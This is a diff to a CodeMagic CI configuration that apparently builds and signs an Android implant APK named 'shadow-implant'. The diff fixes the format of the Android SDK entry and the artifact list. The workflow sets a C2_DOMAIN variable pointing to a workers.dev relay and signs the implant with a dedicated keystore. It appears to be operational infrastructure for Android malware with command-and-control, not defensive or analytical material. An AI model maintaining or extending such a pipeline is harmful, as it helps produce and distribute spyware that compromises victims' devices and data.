@@ -6,8 +6,7 @@ workflows:
     max_build_duration: 30
     instance_type: linux_x2
     environment:
-      android:  # correct format: object with the SDK version
-        sdk_manager: true
+      android: "34"
       java: 17
       vars:
         C2_DOMAIN: cfg-relay.marwannaili-23-07.workers.dev
@@ -36,8 +35,4 @@ workflows:
           java -jar /tmp/apksigner.jar sign --ks app/implant.jks --ks-key-alias "$IMPLANT_KEY_ALIAS" --ks-pass "pass:$IMPLANT_KEYSTORE_PASS" --key-pass "pass:$IMPLANT_KEY_PASS" --out "$OUT" "$IN"
           java -jar /tmp/apksigner.jar verify -v "$OUT" | head -6
     artifacts:
-      # maps to the installArtifacts section in the CodeMagic UI
-      - name: shadow-implant
-        type: file
-        files:
-          - core/android/app/build/outputs/apk/release/shadow-implant-signed.apk
+      - core/android/app/build/outputs/apk/release/shadow-implant-signed.apk
